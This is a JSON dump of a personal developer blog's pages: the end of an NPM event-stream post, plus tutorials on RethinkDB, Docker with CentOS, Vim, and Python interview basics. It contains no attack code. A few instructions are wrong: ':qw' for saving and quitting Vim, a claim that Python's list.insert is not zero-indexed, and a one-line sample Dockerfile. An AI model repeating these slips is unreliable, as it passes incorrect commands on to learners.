KIND\u0026rsquo;. Dose this absolve the original creator for his mistake? Dose the sole responsibility lay with the user of the software, regardless of its state? Unfortunately, this leaves many unanswered questions.\nShould I Trust You? I think it\u0026rsquo;s important to recognize the larger issue here; NPM modules are too easily trusted. I don\u0026rsquo;t know how many times I\u0026rsquo;ve looked online for something, found a package, downloaded it, and used it within my project without question. For all I know, I could be putting my users at risk of some attack by using a malicious dependency. NPM is an amazing tool, but it\u0026rsquo;s important to realize that vulnerabilities exist. Here are some tips for safe NPM package usage:\nIs the package open source? Is the package maintained by a community? Is the community currently active? How can I contribute to maintain this open source project? By involving yourself in the open source projects that you use, you can become a vigilant member of the community that protects and maintains open source software. Solo hero developers are far and few between, so don\u0026rsquo;t depend on them. Get involved, be apart of the open source community, and contribute to the projects that you use.\n","permalink":"https://johncodes.com/posts/npm-event-stream/","summary":"(Note: this post is from a legacy blog dated 12/14/2018 and some content or links may have changed)\nA few weeks ago, this issue was opened on a popular Node NPM package called Event Stream. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, this package is a key dependency for many other Node packages and has over 1 million downloads per week from NPM.","title":"To Catch a Hacker - NPM Even Stream"},{"content":"(Note: this is from an old blog archieve dating 2018/11/05. Some things with Rethink have very likely changed) RethinkDB is a JSON based, non-relational database that provides a promise oriented, Node JS backend. It integrates seamlessly with JSON type data and is a production ready option for Node infrastructures.\nPre-reqs: Docker, Node, NPM\nThis post will serve as a brief overview of RethinkDB and hopefully give you a taste of how it works and why a JSON based database might be beneficial for you and your product. You should have some knowledge of docker for this tutorial, but it\u0026rsquo;s not required. However, knowledge of Node and JavaScript will be necessary.\nRun the offical Docker Image You can pull and run the official rethink docker image to start the database locally. Simply give it a name and you\u0026rsquo;re on your way!\ndocker run -d -P --name \u0026lt;your container name\u0026gt; rethinkdb To check the port mappings in docker, simply run\ndocker port \u0026lt;your container name\u0026gt; This will show you something like this:\n28015/tcp -\u0026gt; 0.0.0.0:32769 29015/tcp -\u0026gt; 0.0.0.0:32768 8080/tcp -\u0026gt; 0.0.0.0:32770 Each of the local port mappings appear on the right and the docker container exposed ports are on the left.\nSo, if you wanted to access the containers 8080 port, we would navigate to localhost:32770. We can see this from the example as 8080/tcp -\u0026gt; 0.0.0.0:32770.\nAlternatively, you can install rethinkdb for your specific machine and run it locally. This can be found on the RethinkDB install page. Using the docker container \u0026amp; image is a nice, light weight, modular way to run rethink, similar to how a production microservice architecture might be configured. I also like being able to control the exact environment that my rethink database is running in, it\u0026rsquo;s ports, and other fun docker quality of life things!\nUsing the RethinkDB admin pannel If using the docker container, navigate to the Admin Panel by going to localhost:32770 in a browser. From our previous example, we can see that this local port is mapped to the docker container port 8080 (which is the web admin panel). If you\u0026rsquo;re running rethink on your machine locally, you should be able to simply navigate to localhost:8080.\nIn the admin pannel, you create new databases, explor data, see logs, track performance, and see what connections are running. Lets create a database with a few tables.\nIn the top navigation bar, go to the \u0026ldquo;Data Explorer\u0026rdquo; and enter the following:\nr.dbCreate(\u0026#39;ships\u0026#39;) r.db(\u0026#39;ships\u0026#39;).tableCreate(\u0026#39;battle_ships\u0026#39;) r.db(\u0026#39;ships\u0026#39;).tableCreate(\u0026#39;cruisers\u0026#39;) These raw rethink queries create and build our initial database. This can also be acomplished from \u0026ldquo;Tables\u0026rdquo; in the top navigation bar or right in your node app! However, the \u0026ldquo;Data Explorer\u0026rdquo; is an essential tool for viewing, manuipulating, and creating data. This is a great link for useful Data Explorer queries.\nInstall Rethink javascript drivers via NPM In order to use the rethink drivers in our Node app, we need to install them via NPM. From the command line:\nnpm install rethinkdb The node_modules folder will now contain the necessary rethink drivers for accessing our rethink instance. To access the rethink drivers from your Node app, require the drivers:\nconst r = require(\u0026#39;rethinkdb\u0026#39;); Open a connection to the Rethink instance let connection = null; // This could also be declared from a .env file let config = { host: \u0026#39;localhost\u0026#39;, port: \u0026#39;32769\u0026#39; } r.connect(config, function(err, conn) { if (err) throw err; connection = conn; }); Now, the connection variable will hold the raw data necessary to connect to the rethink instance. Make special note of what port you specify. This should be the port that maps to 28015 in the docker container.\nFor this local instance of the rethinkdb, we won\u0026rsquo;t worry too much about dynamic ports or not exposing the ports to the public in production. Here is a good article about one way you can create production ready ports and configurations.\nThis step can be quite complicated. You can do a number of things per your needs, including placing this step into some middleware to connect automatically, check the configuration of your database, reconfigure settings if something is wrong, or validate authorization. Check out this repository from the rethink people for more complex operations around connecting.\nBasic Crud Operations Insert Data // Inserts 2 battleships r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;).insert([ { \u0026#39;name\u0026#39;: \u0026#39;Arizona\u0026#39;, \u0026#39;size\u0026#39;: 22, \u0026#39;guns\u0026#39;: [ \u0026#39;railgun\u0026#39;, \u0026#39;off_shore_missles\u0026#39; ] }, { \u0026#39;name\u0026#39;: \u0026#39;Iowa\u0026#39;, \u0026#39;size\u0026#39;: 34, \u0026#39;guns\u0026#39;: [ \u0026#39;light_machine\u0026#39; ] }]).run(connection, function (err, res) { if (err) throw err; console.log(JSON.stringify(res)); }) We can see that we are inserting raw JSON objects! Awesome! Now, from the Data explorer, if we query the battle_ships table:\nr.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;) We will see the following JSON has been entered into the database:\n{ \u0026#34;guns\u0026#34;: [ \u0026#34;railgun\u0026#34; , \u0026#34;off_shore_missles\u0026#34; ] , \u0026#34;id\u0026#34;: \u0026#34;35502dbd-0354-4ca8-bef5-06825ab8df26\u0026#34; , \u0026#34;name\u0026#34;: \u0026#34;Arizona\u0026#34; , \u0026#34;size\u0026#34;: 22 } { \u0026#34;guns\u0026#34;: [ \u0026#34;light_machine\u0026#34; ] , \u0026#34;id\u0026#34;: \u0026#34;b960127b-994f-44b7-88f5-f7463fc90dae\u0026#34; , \u0026#34;name\u0026#34;: \u0026#34;Iowa\u0026#34; , \u0026#34;size\u0026#34;: 34 } Getting data // Get all battle ships r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;) .run(connection, function(err, cursor) { if (err) throw err; cursor.toArray(function(err, res) { if (err) throw err; console.log(JSON.stringify(res)); }); }); In this example, we are getting all the ships in the battle_ships table. Most rethink queries of this size will return a cursor by default, so to get the raw results, we must make it an array with the .toArray method. The callback will contain the results that can than be parsed further.\n// Get specific battleship r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;) .get(\u0026#39;35502dbd-0354-4ca8-bef5-06825ab8df26\u0026#39;) .run(connection, function(err, res) { if (err) throw err; console.log(JSON.stringify(res)); }); This gets a single ship from the battle_ships table based on the primary key. The primary key is the ID automatically assigned to the inserted JSON. The results we get back in the callback function is the JSON object of the provided key.\nUpdate JSON objects // Update the length of The Texas battle ship r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;cruisers\u0026#39;).filter(r.row(\u0026#34;name\u0026#34;).eq(\u0026#34;Texas\u0026#34;)) .update({ \u0026#34;length\u0026#34;: 33 }).run(connection, function(err, res) { if (err) throw err; console.log(JSON.stringify(res)); }); Here, we update a ship\u0026rsquo;s length by providing an updated JSON object. Note that we don\u0026rsquo;t need to provide all fields of the object in order for it to be updated. Once we run the query, the returned result will be what was updated in the database. This snippet also introduces the .filter rethink method. This can be used to pull specific records based on a number of conditions. Finding json objects this way is very powerful and can be chained with other queries. Almost anything you can do with SQL or Mongo, you can do with rethink queries. Check out this awesome page for some really useful queries.\nDelete JSON data // Remove the Iowa battle ship r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;) .filter(r.row(\u0026#39;name\u0026#39;).eq(\u0026#39;Iowa\u0026#39;)) .delete() .run(connection, function(err, res) { if (err) throw err; console.log(JSON.stringify(res)); }); Here, we again use the .filter method to find a document in the database. Then, we delete it using the .delete() rethink method. After running this query, the JSON will be removed from the database.\nConclusion I hope that this little dive into RethinkDB has been interesting and has you curious about JSON based databases. Being able to store raw JSON in a NoSQL database is extremely powerful and fits well with JavaScript based architectures.\n","permalink":"https://johncodes.com/posts/rethink-db-cookbook/","summary":"(Note: this is from an old blog archieve dating 2018/11/05. Some things with Rethink have very likely changed) RethinkDB is a JSON based, non-relational database that provides a promise oriented, Node JS backend. It integrates seamlessly with JSON type data and is a production ready option for Node infrastructures.\nPre-reqs: Docker, Node, NPM\nThis post will serve as a brief overview of RethinkDB and hopefully give you a taste of how it works and why a JSON based database might be beneficial for you and your product.","title":"Rethink-DB Cookbook"},{"content":"If you are a Oregon State CS 344 student, then you\u0026rsquo;ve been told to develop exclusively on the OS1 server. Unfortunately, this server is frequently nuked by fork bombs. If you are unable to run a full CentOS virtual machine, then here is a step by step guide to getting a CentOS docker container running on your computer. This way, you can continue to work on your assignments in a similar environment to OS1 and not have to have a full virtual machine running!\nNote: when a \u0026ldquo;host\u0026rdquo; is referenced, this is in regard to your own laptop and your own environment, not any container or virtual machine you might have running.\n1. Get Docker You can download and install Docker at this link\nDocker creates operating system level virtualizations through \u0026ldquo;containers\u0026rdquo;. It’s alot like a traditional Virtual Machine, but containers are run through the host system kernel while maintaining their own software libraries and configurations. In short, containers are significantly less expensive as they don\u0026rsquo;t have to spin up their own virtual kernels.\n2. Start docker Once you\u0026rsquo;ve installed Docker, fire it up. It will run in the background and give you access to its command line tools.\n3. Pull the CentOS image Grab the CentOS image with the following command:\ndocker pull centos An image is a template \u0026ldquo;snapshot\u0026rdquo; used to build containers. Images contain the specific configurations and packages that define what a container is.\n4. Start the container docker run -i -t centos This will bring up the CentOS container in interactive mode with the CentOS command line. There are a huge number of flags for running containers, but this is an easy way to directly gain access to the CentOS command line.\nHere is the docker reference for flags and running an image.\n5. Install dev dependencies Because this CentOS image is a bare bone, fresh start, linux distro with nothing on it, you will need to install a few unix dev tools. This can easily be done with the following command:\nyum groupinstall \u0026#34;Development tools\u0026#34; To install Vim:\nyum install vim If you find that you\u0026rsquo;re missing some tool, try searching online for the install command (make sure to specify CentOS when googling). It is likely a yum command that you\u0026rsquo;re looking for.\n6. Place files onto container Using SCP You can pull down your files from a server with this command:\nscp username@access.engr.oregonstate.edu:~/path/to/smallsh.zip /path/to/destination Using Docker cp If you have files on your local host machine that you want on the docker container, you can use the built in docker cp command on your host machine:\ndocker cp path/to/file/testing.txt \u0026lt;container name\u0026gt;:/path/to/destination This might look something like this:\ndocker cp path/to/testing.txt wizardly_montalcini:/path/to/target Note: the container needs to be running for this to work!\nTo find the running container name, use the following command on your host machine:\ndocker container ls This will show us something like this. We can find the name on the far right:\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 4218f505a811 centos \u0026#34;/bin/bash\u0026#34; 2 minutes ago Up 2 minutes wizardly_montalcini 7. Work, Compile, Run Now that you have the container running, installed the development dependencies, and pulled your files, you can proceed normally! Work on your program with vim, compile, and run your executable as you would on OS1.\nHere\u0026rsquo;s an example of me doing this on a CentOS docker container\n[root@f30ebeebacde /]# make gcc -Wall -c smallsh.c buffer_io.c utility.c gcc -Wall -o smallsh smallsh.o buffer_io.o utility.o [root@f30ebeebacde /]# ./smallsh :ls README.md buffer_io.c etc lib64 media proc sbin smallsh.c srv usr var anaconda-post.log buffer_io.o home makefile mnt root shelltest smallsh.h sys utility.c bin dev lib mcbridej_smallsh.zip opt run smallsh smallsh.o tmp utility.o :cat README.md # Smallsh Author: John McBride ... 8. Get files off container Once you are ready to get your files back, you can use SCP or the built in docker cp command. These are similar to putting your files onto the container, but with the paths switched.\nUsing SCP scp /path/to/file.txt username@access.engr.oregonstate.edu:~/path/to/target Using docker cp On your local host:\ndocker cp \u0026lt;containerId\u0026gt;:/file/path/within/container /host/path/destination 9. Using Docker volumes There is a better way to get files on and off your container, but it\u0026rsquo;s slightly more complicated. In this example, let\u0026rsquo;s mount a file system volume. You can read all about volumes and how they are defined by docker. But the quick and dirty way to get files on to a container from your host when you start docker is as follows:\n$ docker run -it -v \u0026#34;/host/user/folder/to/mount:/container/destination\u0026#34; centos Note the new -v flag followed by a full file path mapping. Let\u0026rsquo;s break it down. The -v command tells docker to mount a volume. The first part of the path preceding the : defines the source directory in the host\u0026rsquo;s filesystem to mount. The path after the : defines the destination inside the container to mount the directory!\nNow, when you poke around the container, the files from the source folder will be in the destination folder. The really cool thing about this is that files are persisted across volumes. Or in other words, if you change a file that\u0026rsquo;s been mounted by a volume, it will also be changed on host! This eliminates the need for copy files and folders to and from the container!\nMuch thanks to Nathan for pointing out this tidbit!\n10. Exiting the container You can exit and stop a container in interactive mode with Ctrl d\nYou can detach from a container when in interactive mode with Ctrl p Ctrl q. To re-attach to the container, use the docker attach command:\ndocker attach \u0026lt;container name\u0026gt; This would be something like this:\ndocker attach wizardly_montalcini If you need to kill a container, you can use the docker kill command:\ndocker kill \u0026lt;container name\u0026gt; Using our example, this would look like this:\ndocker kill wizardly_montalcini Warning! Containers are NOT persistent. Again, they are NOT persistent. Once one is stopped or killed, you will loose everything on it. If you want to keep a container running, just detach from it or make sure to SCP or docker cp your files off the container before you kill it.\nIf you stop a docker container you can bring it back up with the docker run -i -t centos command.\nExtras! This section will serve as some docker extras.\nCentOS Docker Hub The official CentOS Docker image from docker hub - This has some interesting tid-bits about security dependencies and installing updates.\nDockerfiles Starting the container and installing the dev dependencies every single time you start it can be kind of annoying. Thankfully, you can use dockerfiles to automate building containers. Here is a sample dockerfile that will build the centos container and install the dev dependencies for us.\nCMD yum groupinstall \u0026#34;Development tools\u0026#34; These can get really complicated. Here is some very useful info on how dockerfiles work, how to use them, and how you can make one that fits your needs.\nHere is the official CentOS dockerfile repository on github.\n","permalink":"https://johncodes.com/posts/docker-trouble/","summary":"If you are a Oregon State CS 344 student, then you\u0026rsquo;ve been told to develop exclusively on the OS1 server. Unfortunately, this server is frequently nuked by fork bombs. If you are unable to run a full CentOS virtual machine, then here is a step by step guide to getting a CentOS docker container running on your computer. This way, you can continue to work on your assignments in a similar environment to OS1 and not have to have a full virtual machine running!","title":"Virtual machine trouble?? Try Docker!"},{"content":"(Note: this is a post from a legacy blog. This post was intended to help new OSU students get started with Vim)\nI\u0026rsquo;d consider myself some sort of Vim - evangelist. It\u0026rsquo;s an incredible tool and has ALOT of power. If there\u0026rsquo;s something you wish Vim could do, there\u0026rsquo;s probably a plugin for it or a way to make Vim do it with scripting (in its own language!). Moderate proficiency in Vim is a skill that nearly every developer could benefit from. Being able to modify files directly on a server is necessary in almost every development sphere.\nGet Vim Most unix like operating systems (including MacOS) should come pre-packaged with Vim. If not, you can install it with yum:\nyum install vim Or apt-get\nsudo apt-get update sudo apt-get install vim On windows you\u0026rsquo;ll want to use the installation wizard provided by the vim organization\nOn MacOS, if for some reason you\u0026rsquo;re missing Vim, you can install it with the Homebrew installer (a great package manager and installer):\nbrew install macvim Getting started: Command cheat sheets: Cheat sheets are really great to have printed off at your desk for quick reference. Here are a few of my favorites:\nfprintf.net Linux Training Academy VimSheet.com Interactive Tutorials The Vim browser game This is a great way to learn the movement keys to get around a file and do basic operations. Here are some other great resources on getting started in Vim:\nvimtutor Vim is packaged with its own tutorial named vimtutor! To start the tutorial, simple enter the name of the program! You can exit vimtutor the same way you would normally exit vim (see the section below)\nvimtutor Vim in 4 weeks A comprehensive, in depth plan to learning the various aspects of Vim. This article gets talked alot about when people are learning Vim.\nOnly use Vim! If you only use Vim, and don\u0026rsquo;t let yourself use anything else (like sublime text or VS Code), you\u0026rsquo;ll learn fast (but I would recommend going through one of the interactive tutorials first)!\nExiting Vim: Alot of people start up vim and then get frustrated by not being able to save and exit. It\u0026rsquo;s confusing initially! Here are a few different ways to save and exit!\nSaving and Exiting Hit esc to ensure you\u0026rsquo;re in normal mode Enter the command palette by hitting : Type qw and hit enter. This will \u0026ldquo;write\u0026rdquo; the file and than \u0026ldquo;quit\u0026rdquo; Vim Alternatively: in normal mode, hitting ZZ (yes both capitalized) will save and exit vim for you!\nMaking a hard exit Hit esc to ensure you\u0026rsquo;re in normal mode Enter the command palette by hitting : Type q! and enter to force vim to quite without writing (saving) anything. Danger! All things you typed since your last \u0026ldquo;write\u0026rdquo; will NOT be saved Just saving Hit esc to ensure you\u0026rsquo;re in normal mode Enter the command palette by hitting : Type w and enter to \u0026ldquo;write\u0026rdquo; your changes Customize Vim: When starting Vim, it will search for a .vimrc file in your home directory (based on your home path name). If you don\u0026rsquo;t have one, you can create one (right in your home directory, usually the same directory as your .bashrc) and use it to customize how vim functions on startup! The following are some basics that everyone should have (The reader should note that \u0026quot; are comments in Vimscript):\n\u0026#34; Turns on nice colors colo desert \u0026#34; Turns on the syntax for code. Automatically will recognize various file types syntax on Placing these (and other vimscript things) into your .vimrc will change the behavior of vim when it starts. Here\u0026rsquo;s a vimscript for setting tabs to be 4 spaces!\nfiletype plugin indent on \u0026#34; show existing tab with 4 spaces width set tabstop=4 \u0026#34; when indenting with \u0026#39;\u0026gt;\u0026#39;, use 4 spaces width set shiftwidth=4 \u0026#34; On pressing tab, insert 4 spaces set expandtab This next one is more involved, but it auto creates closing parenthesis for us! We can see that the h and i in this vimscript are the literal movement commands given to vim after auto completing the parenthesis to get the cursor back to the it\u0026rsquo;s correct position.\n\u0026#34; For mapping the opening paran with the closing one inoremap ( ()\u0026lt;Esc\u0026gt;hi This should give you a small taste of what vimscript is like and what it\u0026rsquo;s capable of. It can do alot and it\u0026rsquo;s very powerful. If there\u0026rsquo;s something you want Vim to do (like something special with spacing, indents, comments, etc), search online for it. Someone has likely tried to do the same thing and wrote a Vim script for it.\nThis cool IBM guide goes into some depth with how vim scripting works and what you can build.\nSearch in Vim: Vim makes it super easy to search and find expressions in the file you have open; it\u0026rsquo;s very powerful.\nTo search, when in normal mode (hit esc a few times):\nhit the forward-slash key / Begin typing the phrase or keyword you are looking for Hit enter The cursor will be placed on the first instance of that phrase! While still in normal mode, hit n to go to the next instance of that phrase! Hitting N will go to the previous instance of that phrase To turn off the highlighted phrases you searched for, in normal mode, hit the colon : to enter the command palette Type noh into the command palette to set \u0026ldquo;no highlighting\u0026rdquo; and the highlights will be turned off Split window view! You can have two instances of Vim open at once in a split window on the terminal. This is like tmux, but it\u0026rsquo;s managed exclusively by vim!\nHorizontal split When in normal mode, enter this into the command palette to enter a horizontal split. The \u0026ldquo;name of file to load\u0026rdquo; is the path to a file you want to open. The path is relative to where Vim was started from.\n:split \u0026lt;name of file to load\u0026gt; To achieve a vertical split:\n:vsplit \u0026lt;name of file to load\u0026gt; To change the current active panel, (when in normal mode) hit Ctrl w Ctrl w (yes, that\u0026rsquo;s ctrl w twice)\nInception Start a bash shell (or any other unix-y command) right in Vim! (in other words, yes Inception is real). When in normal mode, start the command palette and use the following command to bring up a bash shell\n:!bash Note the exclamation mark telling Vim to execute the command.\nHere\u0026rsquo;s where it gets crazy. Your initial shell you used to enter Vim is still running. On top of that shell, Vim is running. Now, on top of that, a bash shell instance is now running! It\u0026rsquo;s sort of like an onion with all the layers you can go down into. To get back to Vim, exit your bash instance with the exit command. If you than exit Vim, you will be back to your original shell. A word of warning though, all this job handling and nested processes can get fairly processor hungry. So, if your noticing some chugging, back off alittle on the inception.\nYou can execute almost any unix command like this. For example:\n:!wc sample.txt This will run the word count program for the sample.txt file! Command inception is crazy cool!\nBlock Comments I find this extremely helpful when doing full Vim development. This is taken from the following Stack Overflow discussion\nFor commenting a block of text:\n\u0026ldquo;First, go to the first line you want to comment, press Ctrl V. This will put the editor in the VISUAL BLOCK mode.\nNow using the arrow key, select up to the last line you want commented. Now press Shift i, which will put the editor in INSERT mode and then press #.\nThis will add a hash to the first line. (if this was a C file, just type //). Then press Esc (give it a second), and it will insert a # character on all other selected lines.\u0026rdquo;\nUn-commenting is nearly the same, but in opposite order using the visual block mode!\nTime traveling! Yes, you heard that right, vim makes time travel possible! Note, this ONLY works within current Vim sessions. So, if you exit vim, you will lose your current session\u0026rsquo;s stack of edits.\nOn the Vim command palette, which you can enter from Normal mode by hitting the colon :, you can type \u0026rsquo;earlier\u0026rsquo; and \u0026rsquo;later\u0026rsquo; to go back and forth in your current session stack of edits. This is super helpful if you need to revert a few small changes you\u0026rsquo;ve made in the last minute or want to revert everything you did in the last hour. Or if you decide you do want those changes, go forward in time too!\n:earlier 3m :later 5s Plugins One of the reasons Vim is so great is that there are TONS of awesome plugins for Vim. If you\u0026rsquo;re having a hard time scripting something on your own with vimscript, there\u0026rsquo;s probably a plugin for it! They range anywhere from super useful to super silly. Some of my favorites include the file system NERD tree, the fugitive git client, and ordering pizza with Vim Pizza (yes that\u0026rsquo;s right, you can order pizza with Vim! It can really do it all!)\nCheck out this great resource for discovering Vim plugins, instructions to install them, and buzz around the Vim community.\nConclusion: This by no means is a comprehensive guide. There are a ton of great resources for Vim out there and its capabilities. This guide should serve more as a small taste to what Vim can do and maybe peaked your interest to learning more about it.\nTake heart! Vim has a steep learning curve, and, like any complex tool set, it takes alot of time and practice to get good with. Google is your friend here.\nFeel free to reach out to me if something from this guide was not super clear!\n","permalink":"https://johncodes.com/posts/vim-tips/","summary":"(Note: this is a post from a legacy blog. This post was intended to help new OSU students get started with Vim)\nI\u0026rsquo;d consider myself some sort of Vim - evangelist. It\u0026rsquo;s an incredible tool and has ALOT of power. If there\u0026rsquo;s something you wish Vim could do, there\u0026rsquo;s probably a plugin for it or a way to make Vim do it with scripting (in its own language!). Moderate proficiency in Vim is a skill that nearly every developer could benefit from.","title":"Vim Tips!"},{"content":"Hi there! 🌊 My name is John. I\u0026rsquo;m a software engineer at Amazon Web Services where I work on open source software, kubernetes, Linux operating systems, and cloud technology.\nThis site is my personal landing page and blog. All opinions and views herein are my own opinions and do not reflect those of any current or prior employer.\nEnjoy!\nContact I can be reached at hello@johncodes.com\n","permalink":"https://johncodes.com/about/","summary":"Hi there! 🌊 My name is John. I\u0026rsquo;m a software engineer at Amazon Web Services where I work on open source software, kubernetes, Linux operating systems, and cloud technology.\nThis site is my personal landing page and blog. All opinions and views herein are my own opinions and do not reflect those of any current or prior employer.\nEnjoy!\nContact I can be reached at hello@johncodes.com","title":""},{"content":"The No Nonsense Interview Prep The following is interview preperation material for software engineer and development roles that covers the most common aspects of data structures, algorithms, design, and behavioral.\nThis interview manual is ever evolving; I make changes to it frequently as my experience grows and I find new resources.\nPython Crash Course But why Python? Basic operations Data structures Arrays Python Crash Course The following is a crash course in Python that I\u0026rsquo;ve used to refresh my knowledge and understanding of the langauge from a high level.\nBut why Python? The last thing you want to do during a technical white board interview is stumble over weird or complicated syntax, forget how some library works, or waste time sketching out alot of boilerplate.\nFurther, because of how close python is to normal spoken language, even if the person interviewing you doesn\u0026rsquo;t have a firm grasp of python, they will understand what you\u0026rsquo;re trying to do.\nIn short, it\u0026rsquo;s all about communication. Python is easy to communicate, reason about, simple to understand, and reduces the overall complexity of your technical interview.\nPython is just really simple and un-complicated.\nBasic operations Data structures Arrays # initializing arrays with array values arr = [1, 2, 3] # Use `append()` to insert a new value at end of the array. # This is a O(1) operation but may require that we # grow the underlying datastructure to accommodate the new element. # # An understand of how arrays \u0026#34;grow\u0026#34; under the hood as we add elements # is a necessary part of understanding the time complexity of using arrays. arr.append(4); # Use insert() to insert a value at a specific position. # This inserts 5 at the 2nd position. This is NOT zero indexed. # This is a O(n) operation in the worst case given all elements # may need to be \u0026#34;shifted\u0026#34; or the underlying array may need to grow arr.insert(2, 5) # We can perform an in place sort. # The `arr` will now be sorted. arr.sort() # This returns a sorted copy where `arr` is not mutated. sorted(arr) # You may apply a lambda to the sorting. # # A lambda is essentially an \u0026#34;anonymous\u0026#34; function # that can take any arbitrary number of inputs. # # This example uses an arbitrary \u0026#34;student\u0026#34; class # that has some \u0026#34;grade_point_average\u0026#34; data member. # # For the `.sort()` method, we can supply a key # and in this example, use the student\u0026#39;s gradepoint averages student.sort(key=lambda student: student.grade_point_average) # Reverses the array. # Ever get a \u0026#34;reverse string\u0026#34; question? Just use this! arr.reverse() # Returns the index of the first occurrence of the given element. arr.index(2) # Removes the first occurence of the given element arr.remove(2) # Returns true if element is in the array # The time complexity of this is O(n) in order to scan the whole array if 2 in arr: print(\u0026#39;2 is in the array!\u0026#39;) # Creates a shallow copy (where compound objects are only REFERENCES, not deep copies) copy.copy(arr) # Creates a deep copy which recursively inserts copies of any nest, compound objects # Most of the time, during interview quetsions, you probably want a deep copy copy.deepcopy(arr) # Returns the minimum element within the array min(arr) # Returns the maximum element within the array max(arr) # Slicing is very useful where array[start:stop:step] # So, for example, this prints the array starting at the second element # and going in reverse order. It\u0026#39;d look something like \u0026#34;[2, 1]\u0026#34; print(arr[1::-1]) # List comprehension in python is also super powerful during interviews. # You need 3 things to do list comprehension: # 1. And input sequence # 2. An iterator # 3. A logical condition # # Wrap all of that in the `[ ]` array syntax # and you\u0026#39;ll end up with a new array. # In this example, we are taking x to the power of 2 # where x is the list of number from 0 to 5 # but we only take numbers if they are modulo % 2. # All this in one line! [x**2 for x in range(6) if x % 2 == 0] ","permalink":"https://johncodes.com/interview-prep/","summary":"The No Nonsense Interview Prep The following is interview preperation material for software engineer and development roles that covers the most common aspects of data structures, algorithms, design, and behavioral.\nThis interview manual is ever evolving; I make changes to it frequently as my experience grows and I find new resources.\nPython Crash Course But why Python? Basic operations Data structures Arrays Python Crash Course The following is a crash course in Python that I\u0026rsquo;ve used to refresh my knowledge and understanding of the langauge from a high level.","title":""},{"content":"Talks Inquires: talks@johncodes.com\n2022 The Risks of Single Maintainer Dependencies I spoke at Kubecon EU 2021 on my experience maintaining spf13/cobra with a very small group of other contributors.\nBusiness of Open Source: Exploring the Risks of Single Maintainer Dependencies with John McBride During my time in Spain for Kubecon EU \u0026lsquo;22, I also appeared on the \u0026ldquo;Business of Open Source\u0026rdquo; podcast to discuss maintaining cobra and what startups considering opening sourcing their technologies can learn. You can listen to the episode here.\nDistributed Shared Team Configurations With Oh-My-Zsh ","permalink":"https://johncodes.com/talks/","summary":"Talks Inquires: talks@johncodes.com\n2022 The Risks of Single Maintainer Dependencies I spoke at Kubecon EU 2021 on my experience maintaining spf13/cobra with a very small group of other contributors.\nBusiness of Open Source: Exploring the Risks of Single Maintainer Dependencies with John McBride During my time in Spain for Kubecon EU \u0026lsquo;22, I also appeared on the \u0026ldquo;Business of Open Source\u0026rdquo; podcast to discuss maintaining cobra and what startups considering opening sourcing their technologies can learn.","title":""}]